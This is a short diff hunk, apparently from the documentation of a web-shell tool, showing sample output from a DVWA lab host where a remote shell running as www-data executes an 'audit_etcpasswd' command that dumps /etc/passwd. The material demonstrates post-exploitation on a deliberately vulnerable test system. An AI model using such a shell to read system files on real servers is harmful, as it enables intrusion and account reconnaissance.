@@ -33,7 +33,7 @@ The remote script execution triggers an error 500, check script and payload inte
 www-data@172.28.128.8:/var/www/dvwa/vulnerabilities $ audit_etcpasswd
 The remote script execution triggers an error 500, check script and payload integrity
 root:x:0:0:root:/root:/bin/bash
-..[truncated]..
+..[omitted]..
 msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
 user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
 service:x:1002:1002:,,,:/home/service:/bin/bash
